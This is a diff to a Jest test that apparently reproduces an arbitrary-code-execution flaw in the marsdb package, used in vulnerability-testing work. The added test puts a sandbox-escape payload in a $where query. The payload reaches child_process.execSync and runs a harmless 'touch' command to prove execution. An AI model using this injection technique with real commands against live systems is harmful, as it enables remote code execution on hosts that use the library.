@@ -1,24 +1,26 @@
 test("Arbitrary code execution in marsdb", () => {
-  expect.assertions(2);
-  let Collection = require("marsdb").Collection;
-  expect({}.polluted).toBe(undefined);
-  const posts = new Collection("posts", { inMemory: true });
-  // try {
-  //     let val = posts.insert({ text: 'MarsDB is awesome' });
-  //     return val.then(docId => {
-  //         let out = posts.find({ $where: '(Object.prototype.polluted=`yes`)' });
-  //         out.then(docs => {
-  //             expect({}.polluted).toBe('yes');
-  //         });
-  //     });
-  // } catch (e) {
-  // }
+  const fs = require("fs");
+  const path = "./marsdb";
 
-  return posts.insert({ text: "MarsDB is awesome" }).then((docId) => {
+  expect.assertions(1);
+  try {
+      fs.unlinkSync(path, function (err) {});
+  } catch (error) {}
+  file_exist = fs.existsSync(path);
+  expect(file_exist).toBe(false);
+  let Collection = require("marsdb").Collection;
+  const posts = new Collection("posts", { inMemory: true });
+
+  posts.insert({ text: "MarsDB is awesome" }).then((docId) => {
     return posts
-      .find({ $where: "(Object.prototype.polluted=`yes`)" })
+      .find({ $where: `(import("test").catch((e)=>{})["constructor"]["constructor"]("return process")().mainModule.require("child_process").execSync("touch ${path}"))` })
       .then((docs) => {
-        expect({}.polluted).toBe("yes");
+          expect.assertions(1);
+          file_exist = fs.existsSync(path);
+          expect(file_exist).toBe(true);
+          fs.unlink(path, function (err) {});
       });
   });
+
+
 });
